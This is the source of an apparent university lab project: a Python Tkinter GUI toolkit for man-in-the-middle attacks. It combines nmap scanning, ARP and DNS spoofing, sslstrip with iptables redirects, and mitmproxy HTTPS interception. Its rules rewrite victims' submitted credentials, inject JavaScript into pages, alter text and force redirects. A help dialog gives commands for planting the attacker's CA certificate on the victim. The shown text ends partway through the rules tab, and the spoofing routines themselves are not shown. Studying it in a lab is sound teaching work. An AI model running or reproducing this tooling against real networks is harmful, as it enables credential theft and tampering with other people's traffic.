#!/usr/bin/env python3
# =============================================================================
# CSIE NCYU - Secure Programming Final Project
# 第六題：Man-in-the-Middle Attack 自動化工具 (Phase 4 完整版)
# 環境: Kali Linux (攻擊者) + Metasploitable + Ubuntu (受害者)
# 需要 root 權限執行: sudo python3 mitm_tool.py
# =============================================================================
# 安裝相依套件:
#   pip install scapy python-nmap netfilterqueue mitmproxy
#   apt install python3-tk wireshark-qt sslstrip dsniff
# =============================================================================

import tkinter as tk
from tkinter import messagebox, ttk
import nmap
import threading
import time
import os
import subprocess
from datetime import datetime
from collections import defaultdict
from scapy.all import (
    ARP, DNS, DNSQR, DNSRR, IP, UDP, Ether,
    send, sendp, sniff, conf
)

# ── 全域攻擊者 IP（自動偵測）──────────────────────────────────────────────────
try:
    ATTACKER_IP = subprocess.check_output(
        "hostname -I | awk '{print $1}'", shell=True
    ).decode().strip()
except Exception:
    ATTACKER_IP = "127.0.0.1"


# =============================================================================
# 主應用程式類別
# =============================================================================
class MitmApp:
    def __init__(self, root):
        self.root = root
        self.root.title("CSIE NCYU ── MITM 自動化攻擊與防禦系統 v4.0")
        self.root.geometry("920x680")
        self.root.configure(bg="#0d1117")

        # ── 狀態旗標 ──────────────────────────────────────────────────────────
        self.nm            = nmap.PortScanner()
        self.is_spoofing   = False       # ARP Spoofing 執行中
        self.is_dns_spoof  = False       # DNS Spoofing 執行中
        self.is_sslstrip   = False       # SSL Strip 執行中
        self.is_defending  = False       # 防禦偵測執行中
        self.is_mitm_https = False       # HTTPS 攔截執行中
        self.sslstrip_proc = None        # sslstrip 程序
        self.mitm_proc     = None        # mitmdump 程序

        # DNS Spoofing 對應表：網域 → 偽造 IP（預設指向攻擊者）
        self.dns_spoof_map = {}

        # HTTPS 攔截規則啟用清單（對應 intercept.py 的 ENABLED）
        self.interception_rules = {}    # {規則名: BooleanVar}
        self.fake_user_var = None       # 假帳號（cred_swap 用）
        self.fake_pass_var = None       # 假密碼

        self._build_ui()

    # UI 建構
    def _build_ui(self):
        # ── 頂部標題 ──────────────────────────────────────────────────────────
        header = tk.Frame(self.root, bg="#161b22", pady=8)
        header.pack(fill=tk.X)

        tk.Label(
            header,
            text="  MAN-IN-THE-MIDDLE ATTACK TOOLKIT",
            font=("Courier New", 15, "bold"),
            bg="#161b22", fg="#58a6ff"
        ).pack(side=tk.LEFT, padx=16)

        tk.Label(
            header,
            text=f"攻擊者 IP: {ATTACKER_IP}",
            font=("Courier New", 10),
            bg="#161b22", fg="#8b949e"
        ).pack(side=tk.RIGHT, padx=16)

        # ── 樣式設定 ──────────────────────────────────────────────────────────
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook",        background="#0d1117", borderwidth=0)
        style.configure("TNotebook.Tab",    background="#161b22", foreground="#8b949e",
                        padding=[12, 6],    font=("Courier New", 10, "bold"))
        style.map("TNotebook.Tab",          background=[("selected", "#21262d")],
                                            foreground=[("selected", "#58a6ff")])
        style.configure("Treeview",         background="#161b22", foreground="#c9d1d9",
                        fieldbackground="#161b22", rowheight=24)
        style.configure("Treeview.Heading", background="#21262d", foreground="#58a6ff",
                        font=("Courier New", 9, "bold"))

        # ── PanedWindow：上 Notebook / 下日誌，確保日誌永遠可見 ──────────────
        paned = tk.PanedWindow(self.root, orient=tk.VERTICAL, bg="#0d1117",
                               sashwidth=5, sashrelief=tk.RAISED)
        paned.pack(fill=tk.BOTH, expand=True, padx=8, pady=(4, 6))

        nb_frame = tk.Frame(paned, bg="#0d1117")
        paned.add(nb_frame, minsize=220)

        nb = ttk.Notebook(nb_frame)
        nb.pack(fill=tk.BOTH, expand=True)

        tab1 = tk.Frame(nb, bg="#0d1117")
        tab2 = tk.Frame(nb, bg="#0d1117")
        tab3 = tk.Frame(nb, bg="#0d1117")
        tab4 = tk.Frame(nb, bg="#0d1117")
        tab5 = tk.Frame(nb, bg="#0d1117")
        tab6 = tk.Frame(nb, bg="#0d1117")
        tab7 = tk.Frame(nb, bg="#0d1117")

        nb.add(tab1, text="   掃描 / ARP Spoofing  ")
        nb.add(tab2, text="   DNS Spoofing  ")
        nb.add(tab3, text="   SSL Strip  ")
        nb.add(tab5, text="   HTTPS 攔截  ")
        nb.add(tab6, text="   攔截規則  ")
        nb.add(tab4, text="   防禦偵測  ")
        nb.add(tab7, text="   Ubuntu 防禦  ")

        self._build_tab_arp(tab1)
        self._build_tab_dns(tab2)
        self._build_tab_ssl(tab3)
        self._build_tab_https(tab5)
        self._build_tab_rules(tab6)
        self._build_tab_defense(tab4)
        self._build_tab_victim_defense(tab7)
    
        log_outer = tk.Frame(paned, bg="#0d1117")
        paned.add(log_outer, minsize=160)

        tk.Label(log_outer, text="[ 系統即時日誌 ]",
                 font=("Courier New", 9, "bold"),
                 bg="#0d1117", fg="#3fb950").pack(anchor=tk.W)

        log_inner = tk.Frame(log_outer, bg="#0d1117")
        log_inner.pack(fill=tk.BOTH, expand=True)

        self.log_text = tk.Text(log_inner, bg="#010409", fg="#3fb950",
                                font=("Courier New", 9),
                                insertbackground="#3fb950",
                                relief=tk.FLAT, bd=4)
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        log_sb = ttk.Scrollbar(log_inner, orient=tk.VERTICAL, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=log_sb.set)
        log_sb.pack(side=tk.RIGHT, fill=tk.Y)


    # 分頁 1：掃描 + ARP Spoofing
    def _build_tab_arp(self, parent):
        pad = {"padx": 14, "pady": 5}

        sf = tk.Frame(parent, bg="#0d1117")
        sf.pack(fill=tk.X, **pad)

        tk.Label(sf, text="掃描網段 (CIDR):", bg="#0d1117",
                 fg="#c9d1d9", font=("Courier New", 10)).pack(side=tk.LEFT)

        self.network_entry = tk.Entry(
            sf, font=("Courier New", 10), width=20,
            bg="#21262d", fg="#c9d1d9", insertbackground="white",
            relief=tk.FLAT, bd=4)
        self.network_entry.insert(0, "10.0.2.0/24")
        self.network_entry.pack(side=tk.LEFT, padx=6)

        self.scan_btn = self._btn(sf, " 掃描區網", self._scan_thread, "#1f6feb")
        self.scan_btn.pack(side=tk.LEFT)

        tf = tk.Frame(parent, bg="#0d1117")
        tf.pack(fill=tk.X, expand=False, **pad)

        self.tree = ttk.Treeview(
            tf, columns=("IP", "MAC", "Hostname", "OS"), show="headings", height=8)
        for col, w in [("IP", 130), ("MAC", 165), ("Hostname", 180), ("OS", 160)]:
            self.tree.heading(col, text=col)
            self.tree.column(col, width=w, anchor=tk.CENTER)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.tree.bind("<<TreeviewSelect>>", self._on_tree_select)

        sb = ttk.Scrollbar(tf, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=sb.set)
        sb.pack(side=tk.RIGHT, fill=tk.Y)

        af = tk.Frame(parent, bg="#0d1117")
        af.pack(fill=tk.X, **pad)

        tk.Label(af, text="介面:", bg="#0d1117",
                 fg="#c9d1d9", font=("Courier New", 10)).pack(side=tk.LEFT)
        self.arp_iface_entry = tk.Entry(
            af, width=8, bg="#21262d", fg="#c9d1d9",
            insertbackground="white", font=("Courier New", 10),
            relief=tk.FLAT, bd=4)
        self.arp_iface_entry.insert(0, "eth1")
        self.arp_iface_entry.pack(side=tk.LEFT, padx=(2, 14))

        for label, attr in [("受害者 IP:", "victim_entry"), ("目標/Server IP:", "gateway_entry")]:
            tk.Label(af, text=label, bg="#0d1117",
                     fg="#f85149", font=("Courier New", 10, "bold")).pack(side=tk.LEFT)
            e = tk.Entry(af, width=16, bg="#21262d", fg="#c9d1d9",
                         insertbackground="white", font=("Courier New", 10),
                         relief=tk.FLAT, bd=4)
            e.pack(side=tk.LEFT, padx=(2, 14))
            setattr(self, attr, e)

        # 按鈕另起一行，避免被視窗右側截掉
        bf = tk.Frame(parent, bg="#0d1117")
        bf.pack(fill=tk.X, padx=14, pady=(2, 8))

        self.attack_btn = self._btn(bf, " 啟動 ARP 攻擊", self._start_arp, "#b91c1c")
        self.attack_btn.config(width=20)
        self.attack_btn.pack(side=tk.LEFT, padx=(0, 10))

        self.stop_btn = self._btn(bf, " 停止並修復", self._stop_arp, "#166534")
        self.stop_btn.config(state=tk.DISABLED, width=20)
        self.stop_btn.pack(side=tk.LEFT)


    # 分頁 2：DNS Spoofing
    def _build_tab_dns(self, parent):
        pad = {"padx": 14, "pady": 8}

        # 輸入列
        row = tk.Frame(parent, bg="#0d1117")
        row.pack(fill=tk.X, **pad)

        tk.Label(row, text="網域:", bg="#0d1117", fg="#c9d1d9",
                 font=("Courier New", 10)).pack(side=tk.LEFT)
        self.dns_domain_entry = tk.Entry(
            row, width=25, bg="#21262d", fg="#c9d1d9",
            font=("Courier New", 10), relief=tk.FLAT, bd=4,
            insertbackground="white")
        self.dns_domain_entry.insert(0, "example.com")
        self.dns_domain_entry.pack(side=tk.LEFT, padx=6)

        tk.Label(row, text="偽造 IP:", bg="#0d1117", fg="#c9d1d9",
                 font=("Courier New", 10)).pack(side=tk.LEFT)
        self.dns_fake_ip_entry = tk.Entry(
            row, width=16, bg="#21262d", fg="#c9d1d9",
            font=("Courier New", 10), relief=tk.FLAT, bd=4,
            insertbackground="white")
        self.dns_fake_ip_entry.insert(0, ATTACKER_IP)
        self.dns_fake_ip_entry.pack(side=tk.LEFT, padx=6)

        self._btn(row, "+ 加入", self._add_dns_rule, "#1f6feb").pack(side=tk.LEFT)

        # 對應表
        dtf = tk.Frame(parent, bg="#0d1117")
        dtf.pack(fill=tk.BOTH, expand=True, padx=14, pady=(0, 4))

        self.dns_tree = ttk.Treeview(
            dtf, columns=("Domain", "FakeIP"), show="headings", height=5)
        self.dns_tree.heading("Domain", text="攔截網域")
        self.dns_tree.heading("FakeIP", text="偽造回應 IP")
        self.dns_tree.column("Domain", width=260, anchor=tk.CENTER)
        self.dns_tree.column("FakeIP", width=200, anchor=tk.CENTER)
        self.dns_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        dsb = ttk.Scrollbar(dtf, orient=tk.VERTICAL, command=self.dns_tree.yview)
        self.dns_tree.configure(yscrollcommand=dsb.set)
        dsb.pack(side=tk.RIGHT, fill=tk.Y)

        # 按鈕列
        bf = tk.Frame(parent, bg="#0d1117")
        bf.pack(fill=tk.X, padx=14, pady=(0, 8))

        self._btn(bf, " 啟動 DNS Spoofing", self._start_dns_spoof, "#b91c1c").pack(side=tk.LEFT)
        self._btn(bf, " 停止 DNS Spoofing", self._stop_dns_spoof, "#166534").pack(side=tk.LEFT, padx=8)
        self._btn(bf, " 移除選取規則", self._remove_dns_rule, "#374151").pack(side=tk.LEFT)

    # 分頁 3：封包嗅探（HTTP 明文擷取）
    def _build_tab_sniff(self, parent):
        pad = {"padx": 14, "pady": 6}

        cf = tk.Frame(parent, bg="#0d1117")
        cf.pack(fill=tk.X, **pad)

        tk.Label(cf, text="網卡介面:", bg="#0d1117",
                 fg="#c9d1d9", font=("Courier New", 10)).pack(side=tk.LEFT)

        self.iface_entry = tk.Entry(
            cf, width=12, bg="#21262d", fg="#c9d1d9",
            font=("Courier New", 10), relief=tk.FLAT, bd=4,
            insertbackground="white")
        self.iface_entry.insert(0, "eth0")
        self.iface_entry.pack(side=tk.LEFT, padx=6)

        self._btn(cf, " 開始嗅探", self._start_sniff, "#b91c1c").pack(side=tk.LEFT)
        self._btn(cf, " 停止嗅探", self._stop_sniff,  "#166534").pack(side=tk.LEFT, padx=6)
        self._btn(cf, " 清除",     self._clear_sniff, "#374151").pack(side=tk.LEFT)

        # 擷取結果顯示
        sf = tk.Frame(parent, bg="#0d1117")
        sf.pack(fill=tk.BOTH, expand=True, **pad)

        self.sniff_text = tk.Text(
            sf,
            bg="#010409", fg="#e6edf3",
            font=("Courier New", 9),
            relief=tk.FLAT, bd=4,
            wrap=tk.WORD
        )
        self.sniff_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        ssb = ttk.Scrollbar(sf, orient=tk.VERTICAL, command=self.sniff_text.yview)
        self.sniff_text.configure(yscrollcommand=ssb.set)
        ssb.pack(side=tk.RIGHT, fill=tk.Y)

        # 顏色 tag
        self.sniff_text.tag_config("url",  foreground="#58a6ff")
        self.sniff_text.tag_config("cred", foreground="#f85149", font=("Courier New", 9, "bold"))
        self.sniff_text.tag_config("info", foreground="#8b949e")


    # 分頁 3：SSL Strip
    def _build_tab_ssl(self, parent):
        pad = {"padx": 14, "pady": 6}

        tk.Label(
            parent,
            text="SSL Strip 將 HTTPS 流量降級為 HTTP，使明文帳密可被擷取（須先啟動 ARP Spoofing）",
            bg="#0d1117", fg="#8b949e", font=("Courier New", 9)
        ).pack(anchor=tk.W, **pad)

        sf = tk.Frame(parent, bg="#0d1117")
        sf.pack(fill=tk.X, **pad)

        tk.Label(sf, text="監聽 Port:", bg="#0d1117",
                 fg="#c9d1d9", font=("Courier New", 10)).pack(side=tk.LEFT)
        self.ssl_port_entry = tk.Entry(
            sf, width=8, bg="#21262d", fg="#c9d1d9",
            font=("Courier New", 10), relief=tk.FLAT, bd=4,
            insertbackground="white")
        self.ssl_port_entry.insert(0, "8080")
        self.ssl_port_entry.pack(side=tk.LEFT, padx=6)

        self.ssl_start_btn = self._btn(sf, " 啟動 SSL Strip", self._start_sslstrip, "#b91c1c")
        self.ssl_start_btn.pack(side=tk.LEFT, padx=8)

        self.ssl_stop_btn = self._btn(sf, " 停止", self._stop_sslstrip, "#166534")
        self.ssl_stop_btn.config(state=tk.DISABLED)
        self.ssl_stop_btn.pack(side=tk.LEFT)

        of = tk.Frame(parent, bg="#0d1117")
        of.pack(fill=tk.BOTH, expand=True, **pad)

        tk.Label(of, text="sslstrip 輸出：", bg="#0d1117",
                 fg="#c9d1d9", font=("Courier New", 9, "bold")).pack(anchor=tk.W)

        inner = tk.Frame(of, bg="#0d1117")
        inner.pack(fill=tk.BOTH, expand=True)

        self.ssl_text = tk.Text(
            inner, bg="#010409", fg="#e6edf3",
            font=("Courier New", 9), relief=tk.FLAT, bd=4, wrap=tk.WORD)
        self.ssl_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        ssb = ttk.Scrollbar(inner, orient=tk.VERTICAL, command=self.ssl_text.yview)
        self.ssl_text.configure(yscrollcommand=ssb.set)
        ssb.pack(side=tk.RIGHT, fill=tk.Y)

    # SSL Strip
    def _start_sslstrip(self):
        if not self.is_spoofing:
            messagebox.showwarning("提示", "建議先啟動 ARP Spoofing，否則只能攔截本機流量。")

        port = self.ssl_port_entry.get().strip()
        self._log(f"設定 iptables，將 HTTP 流量導向 port {port}…")

        # iptables 規則
        os.system(f"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port {port} > /dev/null 2>&1")
        os.system(f"iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port {port} > /dev/null 2>&1")

        self.is_sslstrip = True
        self.ssl_start_btn.config(state=tk.DISABLED)
        self.ssl_stop_btn.config(state=tk.NORMAL)

        # 啟動 sslstrip 程序
        threading.Thread(target=self._run_sslstrip, args=(port,), daemon=True).start()

    def _run_sslstrip(self, port):
        try:
            self.sslstrip_proc = subprocess.Popen(
                ["sslstrip", "-l", port],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            self._log(f"sslstrip 已啟動，監聽 port {port}", "OK")
            self._log("在受害者瀏覽器開啟 HTTPS 網站，Wireshark 過濾 http 即可看到明文。")

            # 讀取 sslstrip 輸出
            for line in self.sslstrip_proc.stdout:
                if not self.is_sslstrip:
                    break
                self._ssl_insert(line)

        except FileNotFoundError:
            self._log("找不到 sslstrip，請確認已安裝：apt install sslstrip", "WARN")
            self.root.after(0, lambda: self.ssl_start_btn.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.ssl_stop_btn.config(state=tk.DISABLED))
        except Exception as e:
            self._log(f"sslstrip 錯誤: {e}", "WARN")

    def _stop_sslstrip(self):
        self.is_sslstrip = False
        if self.sslstrip_proc:
            self.sslstrip_proc.terminate()
            self.sslstrip_proc = None

        port = self.ssl_port_entry.get().strip()
        os.system(f"iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port {port} > /dev/null 2>&1")
        os.system(f"iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port {port} > /dev/null 2>&1")

        self._log("SSL Strip 已停止，iptables 規則已清除。", "OK")
        self.ssl_start_btn.config(state=tk.NORMAL)
        self.ssl_stop_btn.config(state=tk.DISABLED)

    def _ssl_insert(self, text):
        def _do():
            self.ssl_text.insert(tk.END, text)
            self.ssl_text.see(tk.END)
        self.root.after(0, _do)


    # 分頁 5：HTTPS 攔截（mitmproxy 透明代理）
    def _build_tab_https(self, parent):
        pad = {"padx": 14, "pady": 6}

        tk.Label(
            parent,
            text="使用 mitmproxy 透明代理解密 HTTPS（需先啟動 ARP Spoofing，且受害者已安裝 mitmproxy CA）",
            bg="#0d1117", fg="#8b949e", font=("Courier New", 9),
            wraplength=800, justify=tk.LEFT
        ).pack(anchor=tk.W, **pad)

        sf = tk.Frame(parent, bg="#0d1117")
        sf.pack(fill=tk.X, **pad)

        tk.Label(sf, text="代理 Port:", bg="#0d1117",
                 fg="#c9d1d9", font=("Courier New", 10)).pack(side=tk.LEFT)
        self.mitm_port_entry = tk.Entry(
            sf, width=8, bg="#21262d", fg="#c9d1d9",
            font=("Courier New", 10), relief=tk.FLAT, bd=4,
            insertbackground="white")
        self.mitm_port_entry.insert(0, "8080")
        self.mitm_port_entry.pack(side=tk.LEFT, padx=6)

        tk.Label(sf, text="介面:", bg="#0d1117",
                 fg="#c9d1d9", font=("Courier New", 10)).pack(side=tk.LEFT)
        self.mitm_iface_entry = tk.Entry(
            sf, width=8, bg="#21262d", fg="#c9d1d9",
            font=("Courier New", 10), relief=tk.FLAT, bd=4,
            insertbackground="white")
        self.mitm_iface_entry.insert(0, "eth0")
        self.mitm_iface_entry.pack(side=tk.LEFT, padx=6)

        self.mitm_start_btn = self._btn(sf, " 啟動 HTTPS 攔截", self._start_mitm_https, "#b91c1c")
        self.mitm_start_btn.pack(side=tk.LEFT, padx=8)

        self.mitm_stop_btn = self._btn(sf, " 停止", self._stop_mitm_https, "#166534")
        self.mitm_stop_btn.config(state=tk.DISABLED)
        self.mitm_stop_btn.pack(side=tk.LEFT)

        self._btn(sf, " 顯示 CA 路徑", self._show_ca_path, "#1f6feb").pack(side=tk.LEFT, padx=8)

        of = tk.Frame(parent, bg="#0d1117")
        of.pack(fill=tk.BOTH, expand=True, **pad)

        tk.Label(of, text="解密後的 HTTPS 流量：", bg="#0d1117",
                 fg="#c9d1d9", font=("Courier New", 9, "bold")).pack(anchor=tk.W)

        inner = tk.Frame(of, bg="#0d1117")
        inner.pack(fill=tk.BOTH, expand=True)

        self.mitm_text = tk.Text(
            inner, bg="#010409", fg="#e6edf3",
            font=("Courier New", 9), relief=tk.FLAT, bd=4, wrap=tk.WORD)
        self.mitm_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        msb = ttk.Scrollbar(inner, orient=tk.VERTICAL, command=self.mitm_text.yview)
        self.mitm_text.configure(yscrollcommand=msb.set)
        msb.pack(side=tk.RIGHT, fill=tk.Y)

        self.mitm_text.tag_config("req",  foreground="#58a6ff", font=("Courier New", 9, "bold"))
        self.mitm_text.tag_config("resp", foreground="#3fb950")
        self.mitm_text.tag_config("info", foreground="#8b949e")
        self.mitm_text.tag_config("warn", foreground="#f85149", font=("Courier New", 9, "bold"))

    def _start_mitm_https(self):
        if not self.is_spoofing:
            if not messagebox.askyesno("提示", "尚未啟動 ARP Spoofing，仍要繼續嗎？\n（若不啟動，將只能攔截送往本機的 HTTPS）"):
                return

        port  = self.mitm_port_entry.get().strip()
        iface = self.mitm_iface_entry.get().strip()

        # 啟動前先清掉殘留的 mitmdump，避免 port 被佔
        os.system("pkill -9 -f mitmdump > /dev/null 2>&1")

        self._log(f"設定 iptables：{iface} 上 443/80 → port {port}")
        os.system(f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 443 -j REDIRECT --to-port {port} > /dev/null 2>&1")
        os.system(f"iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 80  -j REDIRECT --to-port {port} > /dev/null 2>&1")

        self.is_mitm_https = True
        self.mitm_start_btn.config(state=tk.DISABLED)
        self.mitm_stop_btn.config(state=tk.NORMAL)

        threading.Thread(target=self._run_mitmproxy, args=(port,), daemon=True).start()

    def _run_mitmproxy(self, port):
        try:
            # 組裝啟用的規則清單
            enabled = [k for k, v in self.interception_rules.items() if v.get()]
            env = os.environ.copy()
            env["MITM_RULES"] = ",".join(enabled)

            # 把所有規則的參數都塞進環境變數
            env["MITM_FAKE_USER"]    = self._get_rule_param("cred_swap.fake_user", "hacker")
            env["MITM_FAKE_PASS"]    = self._get_rule_param("cred_swap.fake_pass", "owned_by_C")
            env["MITM_INJECT_JS"]    = self._get_rule_param("inject_js.inject_js", "")
            env["MITM_REPLACE_FROM"] = self._get_rule_param("replace_text.replace_from", "登入成功")
            env["MITM_REPLACE_TO"]   = self._get_rule_param("replace_text.replace_to", "登入失敗（已被攻擊者竄改）")
            env["MITM_REDIRECT_FROM"] = self._get_rule_param("redirect.redirect_from", "/")
            env["MITM_REDIRECT_TO"]   = self._get_rule_param("redirect.redirect_to", "/admin")

            # 找 intercept.py 的位置（與本程式同目錄）
            addon_path = os.path.join(
                os.path.dirname(os.path.abspath(__file__)), "intercept.py"
            )
            cmd = ["mitmdump", "--mode", "transparent",
                   "-p", port, "--ssl-insecure",
                   "--set", "flow_detail=3"]
            if os.path.exists(addon_path):
                cmd.extend(["-s", addon_path])
                if enabled:
                    self._log(f"已套用攔截規則: {', '.join(enabled)}", "OK")
                else:
                    self._log("addon 已載入，但未啟用任何攔截規則（純側錄）")
            else:
                self._log(f"找不到 addon: {addon_path}（純側錄模式）", "WARN")

            self.mitm_proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                env=env
            )
            self._log(f"mitmdump 啟動，監聽 port {port}", "OK")
            self._mitm_insert(f"[*] mitmdump 已啟動，等待 HTTPS 流量…\n\n", "info")
            if enabled:
                self._mitm_insert(f"[+] 啟用的攔截規則: {', '.join(enabled)}\n\n", "warn")
            self._mitm_insert(f"[!] 確認受害者已安裝 CA：~/.mitmproxy/mitmproxy-ca-cert.pem\n\n", "warn")

            for line in self.mitm_proc.stdout:
                if not self.is_mitm_https:
                    break
                upper = line.upper()
                if any(m in upper for m in ["GET ", "POST ", "PUT ", "DELETE ", "HEAD ", "PATCH "]):
                    self._mitm_insert(line, "req")
                elif line.startswith("["):     # addon print 出來的內容
                    self._mitm_insert(line, "warn")
                elif "<<" in line or "HTTP/" in line.upper():
                    self._mitm_insert(line, "resp")
                else:
                    self._mitm_insert(line, "info")

        except FileNotFoundError:
            self._log("找不到 mitmdump，請安裝：pip install mitmproxy", "WARN")
            self._mitm_insert("[X] 找不到 mitmdump，請執行：pip install mitmproxy\n", "warn")
            self.root.after(0, lambda: self.mitm_start_btn.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.mitm_stop_btn.config(state=tk.DISABLED))
        except Exception as e:
            self._log(f"mitmdump 錯誤: {e}", "WARN")

    def _stop_mitm_https(self):
        self.is_mitm_https = False
        if self.mitm_proc:
            try:
                self.mitm_proc.terminate()
                try:
                    self.mitm_proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    self.mitm_proc.kill()
                    self.mitm_proc.wait(timeout=2)
            except Exception:
                pass
            self.mitm_proc = None

        # 強制清掉所有殘留的 mitmdump，避免 port 被佔住
        os.system("pkill -9 -f mitmdump > /dev/null 2>&1")

        port  = self.mitm_port_entry.get().strip()
        iface = self.mitm_iface_entry.get().strip()
        os.system(f"iptables -t nat -D PREROUTING -i {iface} -p tcp --dport 443 -j REDIRECT --to-port {port} > /dev/null 2>&1")
        os.system(f"iptables -t nat -D PREROUTING -i {iface} -p tcp --dport 80  -j REDIRECT --to-port {port} > /dev/null 2>&1")

        self._log(f"HTTPS 攔截已停止，port {port} 已釋放，iptables 規則已清除。", "OK")
        self._mitm_insert("\n[*] HTTPS 攔截已停止。\n", "info")
        self.mitm_start_btn.config(state=tk.NORMAL)
        self.mitm_stop_btn.config(state=tk.DISABLED)

    def _show_ca_path(self):
        # mitmdump 由本工具以 root 身分啟動，CA 一定在 /root/.mitmproxy/
        # 但仍保留對非 root 執行的相容性
        candidates = [
            "/root/.mitmproxy/mitmproxy-ca-cert.pem",
            os.path.expanduser("~/.mitmproxy/mitmproxy-ca-cert.pem"),
        ]
        sudo_user = os.environ.get("SUDO_USER")
        if sudo_user:
            candidates.append(os.path.expanduser(f"~{sudo_user}/.mitmproxy/mitmproxy-ca-cert.pem"))

        ca_path = next((p for p in candidates if os.path.exists(p)), None)

        if ca_path:
            msg = (
                f"mitmproxy CA 憑證位置：\n{ca_path}\n\n"
                f"=== 傳送到受害者（在 Kali 執行）===\n"
                f"sudo scp {ca_path} <user>@<受害者IP>:/tmp/\n\n"
                f"或用 Python HTTP server：\n"
                f"  cd {os.path.dirname(ca_path)}\n"
                f"  sudo python3 -m http.server 8000\n"
                f"受害者端：wget http://<Kali_IP>:8000/mitmproxy-ca-cert.pem\n\n"
                f"=== 在受害者上安裝 ===\n"
                f"sudo cp /tmp/mitmproxy-ca-cert.pem \\\n"
                f"    /usr/local/share/ca-certificates/mitmproxy.crt\n"
                f"sudo update-ca-certificates"
            )
        else:
            msg = (
                f"CA 尚未產生，已搜尋下列路徑：\n"
                + "\n".join(f"  • {p}" for p in candidates)
                + "\n\n請先啟動一次 HTTPS 攔截，mitmdump 會自動建立 ~/.mitmproxy/ 並產生 CA。"
                + "\n產生後再點此按鈕查看完整安裝指令。"
            )
        messagebox.showinfo("CA 憑證資訊", msg)

    def _mitm_insert(self, text, tag="info"):
        def _do():
            self.mitm_text.insert(tk.END, text, tag)
            self.mitm_text.see(tk.END)
        self.root.after(0, _do)


    # 分頁 6：攔截規則（mitmproxy addon 控制）
    def _build_tab_rules(self, parent):
        # 滾動容器
        canvas = tk.Canvas(parent, bg="#0d1117", highlightthickness=0)
        scrollbar = ttk.Scrollbar(parent, orient=tk.VERTICAL, command=canvas.yview)
        scroll_frame = tk.Frame(canvas, bg="#0d1117")

        scroll_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        canvas.create_window((0, 0), window=scroll_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)

        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(14, 0), pady=6)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=6)

        # 滾輪支援
        def _on_mousewheel(event):
            canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
        canvas.bind_all("<MouseWheel>", _on_mousewheel)
        canvas.bind_all("<Button-4>", lambda e: canvas.yview_scroll(-1, "units"))
        canvas.bind_all("<Button-5>", lambda e: canvas.yview_scroll(1, "units"))

        tk.Label(
            scroll_frame,
            text="勾選要啟用的攔截規則並編輯其參數，啟動 HTTPS 攔截時自動套用",
            bg="#0d1117", fg="#8b949e", font=("Courier New", 9),
            wraplength=820, justify=tk.LEFT
        ).pack(anchor=tk.W, pady=(0, 8), padx=4)

        # 用來存所有可編輯參數的變數
        self.rule_vars = {}        # 規則啟用狀態
        self.rule_params = {}      # 規則參數值

        # ── 規則 1：帳密替換 ──────────────────────────────────────
        self._add_rule_block(scroll_frame, "cred_swap", " 帳密替換",
            "把受害者送出的 username / password 換成假值",
            [("fake_user", "假帳號:", "hacker", 20),
             ("fake_pass", "假密碼:", "owned_by_C", 20)])

        # ── 規則 2：JS 注入 ───────────────────────────────────────
        default_js = ('<script>\n'
                      'document.addEventListener("DOMContentLoaded",function(){\n'
                      '  var b=document.createElement("div");\n'
                      '  b.style.cssText="position:fixed;top:0;left:0;right:0;'
                      'background:red;color:white;text-align:center;padding:10px;'
                      'z-index:99999;font-family:Arial;";\n'
                      '  b.innerText="⚠ 你的連線被中間人攔截 (Demo by MITM Toolkit) ⚠";\n'
                      '  document.body.appendChild(b);\n'
                      '});\n'
                      '</script>')
        self._add_rule_block(scroll_frame, "inject_js", " JS 注入",
            "在所有 HTML 回應的 </body> 前注入 JavaScript",
            [("inject_js", "JS payload (多行):", default_js, None)])

        # ── 規則 3：文字替換 ─────────────────────────────────────
        self._add_rule_block(scroll_frame, "replace_text", " 文字替換",
            "把回應 HTML 中的某段文字換成另一段",
            [("replace_from", "原文字:", "登入成功", 30),
             ("replace_to",   "替換成:", "登入失敗（已被攻擊者竄改）", 30)])

        # ── 規則 4：強制重導 ─────────────────────────────────────
        self._add_rule_block(scroll_frame, "redirect", " 強制重導",
            "把指定路徑的請求改寫成另一個路徑",
            [("redirect_from", "原路徑:", "/", 20),
             ("redirect_to",   "改寫為:", "/admin", 20)])

        # 使用提示
        tip = tk.LabelFrame(
            scroll_frame, text=" 使用提示 ",
            bg="#0d1117", fg="#3fb950",
            font=("Courier New", 9, "bold"), bd=1, relief=tk.GROOVE)
        tip.pack(fill=tk.X, pady=8, padx=4)
        tips = [
            "1. 勾選想啟用的規則（可複選），同時 ARP Spoofing 必須先啟動",
            "2. 編輯下方參數，未勾選的規則參數不會被套用",
            "3. 切到「 HTTPS 攔截」分頁，點「啟動 HTTPS 攔截」",
            "4. 修改規則或參數後需「停止」再重新「啟動」才會生效",
        ]
        for t in tips:
            tk.Label(tip, text=t, bg="#0d1117", fg="#c9d1d9",
                     font=("Courier New", 9), anchor=tk.W
                     ).pack(fill=tk.X, padx=8, pady=1)

        # 為了相容舊版本變數名稱
        self.interception_rules = self.rule_vars
